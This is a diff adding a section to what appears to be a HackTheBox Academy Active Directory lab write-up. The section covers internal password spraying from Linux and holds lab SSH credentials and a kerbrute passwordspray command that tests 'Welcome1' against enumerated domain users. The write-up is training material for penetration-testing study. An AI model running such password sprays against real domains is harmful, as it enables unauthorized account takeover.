@@ -359,3 +359,16 @@ This gave me the following results:
 2025/03/14 11:26:25 >  [+] VALID USERNAME:	 wshepherd@inlanefreight.local
 2025/03/14 11:26:25 >  Done! Tested 48705 usernames (56 valid) in 14.542 seconds
 ```
+
+## Internal Password Spraying - from Linux
+> SSH to 10.129.22.33 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"
+
+* **Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer.**
+
+Using the list of valid usernames we collected in the previous step, I ran Kerbrute to perform a password spray attack.
+```c
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+```
+Kerbrute returned a valid login that starts with the letter "s", confirming the user has the password Welcome1.
+
+[![Screenshot-2025-03-14-134928.png](https://i.postimg.cc/020jMgBq/Screenshot-2025-03-14-134928.png)](https://postimg.cc/bsdpW5P6)
